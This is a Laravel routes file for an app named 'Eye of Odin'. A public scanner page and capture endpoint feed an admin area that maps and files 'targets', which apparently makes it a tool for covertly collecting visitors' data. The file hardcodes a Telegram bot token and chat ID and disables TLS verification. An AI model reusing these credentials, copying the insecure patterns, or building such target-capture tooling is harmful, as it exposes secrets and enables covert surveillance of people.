<?php

use App\Http\Controllers\ProfileController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\EyeOfOdinController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Http;

/*
|--------------------------------------------------------------------------
| 1. RUTAS PÚBLICAS Y ESCÁNER (ODÍN)
|--------------------------------------------------------------------------
*/

Route::get('/', function () {
    return view('welcome');
});

// Rutas del Escáner y Captura
Route::get('/odin-scanner', function () { return view('odin'); })->name('odin.scanner');
Route::get('/odin-test', function () { return view('odin'); })->name('odin.test');
Route::post('/capture', [EyeOfOdinController::class, 'capture'])->name('odin.capture');

/*
|--------------------------------------------------------------------------
| 2. RUTAS PRIVADAS (ADMINISTRACIÓN)
|--------------------------------------------------------------------------
*/

Route::middleware(['auth', 'verified'])->group(function () {
    
    // Panel de Control
    Route::get('/dashboard', function () {
        return view('dashboard');
    })->name('dashboard');

    // Ver listado profesional de capturas
    Route::get('/admin/listado-capturas', [EyeOfOdinController::class, 'listCaptures'])->name('odin.list');

    // CRUD de Usuarios
    Route::resource('users', UserController::class);

    // Gestión de Perfil
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');

    // --- SISTEMA DE RADAR Y MAPA ---
    // Vista del Mapa
    Route::get('/admin/map', [EyeOfOdinController::class, 'showMap'])->name('odin.map');
    // API de Datos para Leaflet (JSON)
    Route::get('/admin/map-data', [EyeOfOdinController::class, 'mapData'])->name('odin.map.data');

    // --- GESTIÓN DE EXPEDIENTES ---
    // Ver detalle (Esta es la ruta que te pedía el error: odin.show)
    Route::get('/target/{id}', [EyeOfOdinController::class, 'show'])->name('odin.show');
    // Descargar PDF
    Route::get('/target/{id}/pdf', [EyeOfOdinController::class, 'downloadPDF'])->name('odin.pdf');
    

    // --- HERRAMIENTAS DE DIAGNÓSTICO ---
    Route::get('/fix-system', [EyeOfOdinController::class, 'fixSystem'])->name('odin.fix');
    Route::get('/test-db', [EyeOfOdinController::class, 'testDatabase'])->name('odin.test-db');

    Route::get('/admin/diagnostico-imagenes', [EyeOfOdinController::class, 'checkIntegrity'])->name('odin.check');
    Route::get('/admin/clean-db', [App\Http\Controllers\EyeOfOdinController::class, 'cleanDatabasePaths']);
    
    Route::get('/admin/clean-db', [EyeOfOdinController::class, 'cleanDatabasePaths']);
    
    // Test de Telegram integrado
    Route::get('/test-telegram', function () {
        $token = "8458522831:AAER4WucjipsFHRD7wbXbC-iZOgNKLgQiYI";
        $chat_id = "5639483306";
        try {
            $response = Http::withoutVerifying()->post("https://api.telegram.org/bot$token/sendMessage", [
                'chat_id' => $chat_id,
                'text'    => "⚡ ODÍN: Rutas sincronizadas y nombre 'odin.show' activado.",
            ]);
            return $response->json();
        } catch (\Exception $e) {
            return "Error: " . $e->getMessage();
        }
    })->name('odin.test-telegram');
});

/*
|--------------------------------------------------------------------------
| 3. AUTENTICACIÓN (BREEZE/JETSTREAM)
|--------------------------------------------------------------------------
*/
require __DIR__.'/auth.php';